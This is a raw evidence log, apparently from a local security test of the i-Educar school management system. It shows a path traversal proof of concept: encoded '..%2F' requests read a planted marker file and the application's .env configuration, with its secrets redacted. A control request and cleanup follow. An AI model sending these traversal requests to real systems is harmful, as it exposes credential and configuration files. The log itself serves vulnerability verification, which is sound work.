@@ -1,0 +1,112 @@
+# i-explorar raw evidence
+# started_at: 2026-09-11T00:17:20.301333+00:00
+# host: -03
+# target: http://127.0.0.1:8080
+$ docker compose exec -T php sh -c 'cat > /var/www/ieducar/i_explorar_poc05_marker.html'  # marker written
+
+--- seed output ---
+(empty)
+--- end seed output ---
+
+### GET /module/x/styles/..%2F..%2F..%2Fi_explorar_poc05_marker.html
+HTTP 200 content-type=text/html; charset=utf-8
+
+--- body ---
+<html><head><title>i-explorar VULN 05 marker</title></head><body><h1>i-explorar VULN 05 — arbitrary file read</h1><p>This file lives at <code>/var/www/ieducar/i_explorar_poc05_marker.html</code> and was read through <code>GET /module/x/styles/..%2F..%2F..%2Fi_explorar_poc05_marker.html</code></p></body></html>
+--- end body ---
+
+### GET /module/x/styles/..%2F..%2F..%2F.env
+HTTP 200 content-type=text/plain; charset=utf-8
+
+--- body (secrets redacted by the evidence writer) ---
+APP_NAME=i-Educar
+APP_ENV=local
+APP_KEY=<redacted>
+APP_DEBUG=true
+APP_URL=http://localhost
+APP_TIMEZONE=America/Sao_Paulo
+APP_TRACK_ERROR=false
+APP_DEFAULT_HOST=ieducar.com.br
+
+ASSETS_SECURE=false
+
+API_ACCESS_KEY=
+API_SECRET_KEY=
+
+LEGACY_CODE=true
+LEGACY_DISPLAY_ERRORS=false
+LEGACY_PATH=ieducar
+LOG_CHANNEL=stack
+LOG_FILE_PERMISSION=0777
+
+TELESCOPE_ENABLED=false
+
+DB_CONNECTION=pgsql
+DB_HOST=localhost
+DB_PORT=5432
+DB_DATABASE=ieducar
+DB_USERNAME=ieducar
+DB_PASSWORD=<redacted>
+
+BROADCAST_DRIVER=null
+CACHE_STORE=redis
+CACHE_TTL=604800
+QUEUE_CONNECTION=sync
+SESSION_DRIVER=file
+SESSION_LIFETIME=120
+
+REDIS_HOST=localhost
+REDIS_CLIENT=predis
+REDIS_PASSWORD=<redacted>
+REDIS_PORT=6379
+REDIS_PREFIX=ieducar-
+
+SENTINEL_HOSTS=localhost
+SENTINEL_PORT=26379
+
+MAIL_MAILER=smtp
+MAIL_HOST=smtp.mailtrap.io
+MAIL_PORT=2525
+MAIL_USERNAME=null
+MAIL_PASSWORD=<redacted>
+MAIL_ENCRYPTION=null
+
+PUSHER_APP_ID=
+PUSHER_APP_KEY=
+PUSHER_APP_SECRET=
+PUSHER_APP_CLUSTER=mt1
+
+MIX_PUSHER_APP_KEY=<redacted>
+MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+
+HONEYBADGER_API_KEY=
+
+GOOGLE_TAG_MANAGER=
+
+FILESYSTEM_DISK=local
+
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+AWS_DEFAULT_REGION=
+AWS_BUCKET=
+
+MIX_SOCKET_SERVER=127.0.0.1
+MIX_SOCKET_PORT=6001
+
+HOST_UID=1000
+HOST_GID=1000
+
+DOCKER_NGINX_PORT=8080
+DOCKER_NGINX_SSL_PORT=8443
+DOCKER_POSTGRES_PORT=15432
+DOCKER_REDIS_PORT=6379
+--- end body (secrets redacted by the evidence writer) ---
+
+### control: GET /module/x/styles/..%2F..%2F..%2Fno_such_file_i_explorar
+HTTP 500
+$ docker compose exec -T php rm -f /var/www/ieducar/i_explorar_poc05_marker.html
+
+--- cleanup output ---
+(empty)
+--- end cleanup output ---
+# finished_at: 2026-09-11T00:17:21.396470+00:00
